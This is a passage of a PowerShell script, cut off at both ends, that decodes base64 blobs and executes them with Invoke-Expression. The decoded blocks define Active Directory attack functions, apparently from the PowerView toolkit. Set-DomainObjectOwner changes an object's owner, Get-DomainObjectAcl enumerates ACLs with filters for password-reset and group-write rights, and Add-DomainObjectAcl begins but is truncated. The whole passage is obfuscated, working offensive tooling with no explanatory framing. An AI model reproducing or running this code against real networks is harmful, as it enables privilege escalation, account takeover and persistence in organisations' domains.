1bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJE93bmVyU2lkID0gR2V0LURvbWFpbk9iamVjdCBAU2VhcmNoZXJBcmd1bWVudHMgLUlkZW50aXR5ICRPd25lcklkZW50aXR5IC1Qcm9wZXJ0aWVzIG9iamVjdHNpZCB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IG9iamVjdHNpZAogICAgICAgIGlmICgkT3duZXJTaWQpIHsKICAgICAgICAgICAgJE93bmVySWRlbnRpdHlSZWZlcmVuY2UgPSBbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXJdJE93bmVyU2lkCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpbk9iamVjdE93bmVyXSBFcnJvciBwYXJzaW5nIG93bmVyIGlkZW50aXR5ICckT3duZXJJZGVudGl0eSciCiAgICAgICAgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRPd25lcklkZW50aXR5UmVmZXJlbmNlKSB7CiAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snUmF3J10gPSAkVHJ1ZQogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkSWRlbnRpdHkKICAgICAgICAgICAgJFJhd09iamVjdCA9IEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgIEZvckVhY2ggKCRPYmplY3QgaW4gJFJhd09iamVjdCkgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbU2V0LURvbWFpbk9iamVjdE93bmVyXSBBdHRlbXB0aW5nIHRvIHNldCB0aGUgb3duZXIgZm9yICckSWRlbnRpdHknIHRvICckT3duZXJJZGVudGl0eSciCiAgICAgICAgICAgICAgICAgICAgJEVudHJ5ID0gJFJhd09iamVjdC5HZXREaXJlY3RvcnlFbnRyeSgpCiAgICAgICAgICAgICAgICAgICAgJEVudHJ5LlBzQmFzZS5PcHRpb25zLlNlY3VyaXR5TWFza3MgPSAnT3duZXInCiAgICAgICAgICAgICAgICAgICAgJEVudHJ5LlBzQmFzZS5PYmplY3RTZWN1cml0eS5TZXRPd25lcigkT3duZXJJZGVudGl0eVJlZmVyZW5jZSkKICAgICAgICAgICAgICAgICAgICAkRW50cnkuUHNCYXNlLkNvbW1pdENoYW5nZXMoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltTZXQtRG9tYWluT2JqZWN0T3duZXJdIEVycm9yIHNldHRpbmcgb3duZXI6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbk9iamVjdEFjbCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5BQ0wnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRJZGVudGl0eSwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRTYWNsLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJlc29sdmVHVUlEcywKICAgICAgICBbU3RyaW5nXQogICAgICAgIFtBbGlhcygnUmlnaHRzJyldCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdBbGwnLCAnUmVzZXRQYXNzd29yZCcsICdXcml0ZU1lbWJlcnMnKV0KICAgICAgICAkUmlnaHRzRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnc2FtYWNjb3VudG5hbWUsbnRzZWN1cml0eWRlc2NyaXB0b3IsZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lkJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTYWNsJ10pIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAnU2FjbCcKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJ0RhY2wnCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJFNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICREb21haW5HVUlETWFwQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJERvbWFpbkdVSURNYXBBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJERvbWFpbkdVSURNYXBBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkRG9tYWluR1VJRE1hcEFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJERvbWFpbkdVSURNYXBBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICREb21haW5HVUlETWFwQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzb2x2ZUdVSURzJ10pIHsKICAgICAgICAgICAgJEdVSURzID0gR2V0LURvbWFpbkdVSURNYXAgQERvbWFpbkdVSURNYXBBcmd1bWVudHMKICAgICAgICB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFNlYXJjaGVyKSB7CiAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeUy0xLS4qJykgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXihDTnxPVXxEQyk9LionKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIGlmICgoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSAtYW5kICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlEb21haW4gPSAkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoJElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PYmplY3RBY2xdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2UnIgogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJElkZW50aXR5RG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKC1ub3QgJFNlYXJjaGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpbk9iamVjdEFjbF0gVW5hYmxlIHRvIHJldHJpZXZlIGRvbWFpbiBzZWFyY2hlciBmb3IgJyRJZGVudGl0eURvbWFpbiciCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1pbWF0Y2ggJ15bMC05QS1GXXs4fS0oWzAtOUEtRl17NH0tKXszfVswLTlBLUZdezEyfSQnKSB7CiAgICAgICAgICAgICAgICAgICAgJEd1aWRCeXRlU3RyaW5nID0gKChbR3VpZF0kSWRlbnRpdHlJbnN0YW5jZSkuVG9CeXRlQXJyYXkoKSB8IEZvckVhY2gtT2JqZWN0IHsgJ1wnICsgJF8uVG9TdHJpbmcoJ1gyJykgfSkgLWpvaW4gJycKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RndWlkPSRHdWlkQnl0ZVN0cmluZykiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlLkNvbnRhaW5zKCcuJykpIHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIih8KHNhbUFjY291bnROYW1lPSRJZGVudGl0eUluc3RhbmNlKShuYW1lPSRJZGVudGl0eUluc3RhbmNlKShkbnNob3N0bmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIofChzYW1BY2NvdW50TmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkobmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkoZGlzcGxheW5hbWU9JElkZW50aXR5SW5zdGFuY2UpKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJElkZW50aXR5RmlsdGVyIC1hbmQgKCRJZGVudGl0eUZpbHRlci5UcmltKCkgLW5lICcnKSApIHsKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIih8JElkZW50aXR5RmlsdGVyKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT2JqZWN0QWNsXSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmlsdGVyOiAkTERBUEZpbHRlciIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIiRMREFQRmlsdGVyIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkRmlsdGVyKSB7CiAgICAgICAgICAgICAgICAkU2VhcmNoZXIuZmlsdGVyID0gIigmJEZpbHRlcikiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PYmplY3RBY2xdIEdldC1Eb21haW5PYmplY3RBY2wgZmlsdGVyIHN0cmluZzogJCgkU2VhcmNoZXIuZmlsdGVyKSIKICAgICAgICAgICAgJFJlc3VsdHMgPSAkU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkT2JqZWN0ID0gJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgaWYgKCRPYmplY3Qub2JqZWN0c2lkIC1hbmQgJE9iamVjdC5vYmplY3RzaWRbMF0pIHsKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0U2lkID0gKE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXIoJE9iamVjdC5vYmplY3RzaWRbMF0sMCkpLlZhbHVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0U2lkID0gJE51bGwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgTmV3LU9iamVjdCBTZWN1cml0eS5BY2Nlc3NDb250cm9sLlJhd1NlY3VyaXR5RGVzY3JpcHRvciAtQXJndW1lbnRMaXN0ICRPYmplY3RbJ250c2VjdXJpdHlkZXNjcmlwdG9yJ11bMF0sIDAgfCBGb3JFYWNoLU9iamVjdCB7IGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NhY2wnXSkgeyRfLlN5c3RlbUFjbH0gZWxzZSB7JF8uRGlzY3JldGlvbmFyeUFjbH0gfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmlnaHRzRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHdWlkRmlsdGVyID0gU3dpdGNoICgkUmlnaHRzRmlsdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1Jlc2V0UGFzc3dvcmQnIHsgJzAwMjk5NTcwLTI0NmQtMTFkMC1hNzY4LTAwYWEwMDZlMDUyOScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdXcml0ZU1lbWJlcnMnIHsgJ2JmOTY3OWMwLTBkZTYtMTFkMC1hMjg1LTAwYWEwMDMwNDllMicgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlZmF1bHQgeyAnMDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJF8uT2JqZWN0VHlwZSAtZXEgJEd1aWRGaWx0ZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXyB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdPYmplY3RETicgJE9iamVjdC5kaXN0aW5ndWlzaGVkbmFtZVswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ09iamVjdFNJRCcgJE9iamVjdFNpZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXyB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdPYmplY3RETicgJE9iamVjdC5kaXN0aW5ndWlzaGVkbmFtZVswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnT2JqZWN0U0lEJyAkT2JqZWN0U2lkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ29udGludWUgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkQ29udGludWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0FjdGl2ZURpcmVjdG9yeVJpZ2h0cycgKFtFbnVtXTo6VG9PYmplY3QoW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlSaWdodHNdLCAkXy5BY2Nlc3NNYXNrKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkR1VJRHMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQWNsUHJvcGVydGllcyA9IEB7fQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfLnBzb2JqZWN0LnByb3BlcnRpZXMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5OYW1lIC1tYXRjaCAnT2JqZWN0VHlwZXxJbmhlcml0ZWRPYmplY3RUeXBlfE9iamVjdEFjZVR5cGV8SW5oZXJpdGVkT2JqZWN0QWNlVHlwZScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFjbFByb3BlcnRpZXNbJF8uTmFtZV0gPSAkR1VJRHNbJF8uVmFsdWUudG9TdHJpbmcoKV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQWNsUHJvcGVydGllc1skXy5OYW1lXSA9ICRfLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQWNsUHJvcGVydGllc1skXy5OYW1lXSA9ICRfLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE91dE9iamVjdCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IC1Qcm9wZXJ0eSAkQWNsUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPdXRPYmplY3QuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkFDTCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE91dE9iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkFDTCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbk9iamVjdEFjbF0gRXJyb3I6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQWRkLURvbWFpbk9iamVjdEFjbCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFRhcmdldElkZW50aXR5LAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVGFyZ2V0RG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRUYXJnZXRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVGFyZ2V0U2VhcmNoQmFzZSwKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJpbmNpcGFsSWRlbnRpdHksCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQcmluY2lwYWxEb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW